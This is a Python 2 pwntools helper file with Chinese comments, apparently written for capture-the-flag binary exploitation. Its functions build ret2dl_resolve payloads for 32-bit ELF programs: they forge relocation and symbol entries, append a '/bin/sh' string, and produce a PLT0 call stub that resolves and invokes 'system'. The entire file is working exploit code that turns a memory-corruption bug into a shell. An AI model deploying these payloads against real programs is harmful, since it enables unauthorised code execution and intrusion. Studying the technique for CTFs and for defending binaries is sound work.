#coding:utf-8
from pwn import *
import os
import sys

# x86 dl_resolve
def _align(addr, origin, size):
	padlen = size - ((addr-origin) % size)
	return (addr+padlen, padlen)

"""
elf就是题目文件
base是可以控制的内容的地址(bss)
name是需要调用的系统调用的名称(system)
target是伪造的got表的地址, 不过一般用不着, 因为dl_resolve结束之后会自动调用解析目标函数,
  所以需要提前把参数配好
"""
def dl_resolve_data(elf, base, name="system", target=0):
  jmprel = elf.dynamic_value_by_tag('DT_JMPREL')
  relent = elf.dynamic_value_by_tag('DT_RELENT')
  symtab = elf.dynamic_value_by_tag('DT_SYMTAB')
  syment = elf.dynamic_value_by_tag('DT_SYMENT')
  strtab = elf.dynamic_value_by_tag('DT_STRTAB')
  addr_reloc, padlen_reloc = _align(base, jmprel, relent)
  log.debug("addr_reloc:"+hex(addr_reloc))
  log.debug("padlen_reloc:"+hex(padlen_reloc))

  log.debug("symtab:"+hex(symtab))
  log.debug("first:"+hex(addr_reloc+relent))
  addr_sym, padlen_sym = _align(addr_reloc+relent, symtab, syment)
  log.debug("addr_sym:"+hex(addr_sym))
  log.debug("padlen_sym:"+hex(padlen_sym))
  addr_symstr = addr_sym + syment

  r_info = (((addr_sym - symtab) / syment) << 8) | 0x7
  st_name = addr_symstr - strtab

  buf = cyclic(padlen_reloc)
  buf += struct.pack('<II', target, r_info)            # Elf32_Rel
  buf += cyclic(padlen_sym)
  buf += struct.pack('<IIII', st_name, 0, 0, 0x12)       # Elf32_Sym
  buf += (name+'\x00')
  binsh_addr = base + len(buf)
  buf += "/bin/sh\x00"
  return (buf, binsh_addr)

"""
elf 就是题目文件
base 就是之前可控内容的地址, 里面有事先伪造的REL_entry和SYM_entry等信息
plt_0 就是plt表的地址, 用来调用dl_resolve
ret_addr 是系统调用结束后的返回地址, 如果system的话就不需要了
"""
def dl_resolve_call(elf, base, plt_0=0, ret_addr=0):
  jmprel = elf.dynamic_value_by_tag('DT_JMPREL')
  relent = elf.dynamic_value_by_tag('DT_RELENT')
  addr_reloc, padlen_reloc = _align(base, jmprel, relent)
  log.debug("addr_reloc:"+hex(addr_reloc))
  reloc_offset = addr_reloc - jmprel
  buf = p32(elf.get_section_by_name('.plt').header.sh_addr if plt_0==0 else plt_0)
  buf += p32(reloc_offset)
  buf += p32(ret_addr)
  return buf


'''
from veritas501
'''
def ret2dl_resolve_x86(ELF_obj,func_name,resolve_addr,fake_stage,do_slim=1):
  jmprel = ELF_obj.dynamic_value_by_tag("DT_JMPREL")#rel_plt
  relent = ELF_obj.dynamic_value_by_tag("DT_RELENT")
  symtab = ELF_obj.dynamic_value_by_tag("DT_SYMTAB")#dynsym
  syment = ELF_obj.dynamic_value_by_tag("DT_SYMENT")
  strtab = ELF_obj.dynamic_value_by_tag("DT_STRTAB")#dynstr
  versym = ELF_obj.dynamic_value_by_tag("DT_VERSYM")#version
  plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr

  p_name = fake_stage+8-strtab
  len_bypass_version = 8-(len(func_name)+1)%0x8
  print("(len(func_name)+1):"+hex((len(func_name)+1)))
  print("fake_stage:"+hex(fake_stage))
  print("symtab:"+hex(symtab))
  print("len_bypass_version:"+hex(len_bypass_version))
  sym_addr_offset = fake_stage+8+(len(func_name)+1)+len_bypass_version-symtab
  print("sym_addr_offset:"+hex(sym_addr_offset))
  if sym_addr_offset%0x10 != 0:
    if sym_addr_offset%0x10 == 8:
      len_bypass_version+=8
      sym_addr_offset = fake_stage+8+(len(func_name)+1)+len_bypass_version-symtab
    else:
      print(hex(sym_addr_offset))
      error('something error!')

  fake_sym = sym_addr_offset/0x10

  while True:
    fake_ndx = u16(ELF_obj.read(versym+fake_sym*2,2))
    if fake_ndx != 0:
      fake_sym+=1
      len_bypass_version+=0x10
      continue
    else:
      break

  if do_slim:
    slim = len_bypass_version - len_bypass_version%8
    version = len_bypass_version%8
    resolve_data,resolve_call=ret2dl_resolve_x86(ELF_obj,func_name,resolve_addr,fake_stage+slim,0)
    return (resolve_data,resolve_call,fake_stage+slim)

  fake_r_info = fake_sym<<8|0x7
  reloc_offset=fake_stage-jmprel

  resolve_data = p32(resolve_addr)+p32(fake_r_info)+func_name+'\x00'
  resolve_data += 'a'*len_bypass_version
  resolve_data += p32(p_name)+p32(0)+p32(0)+p32(0x12)

  resolve_call = p32(plt0)+p32(reloc_offset)

  return (resolve_data,resolve_call)
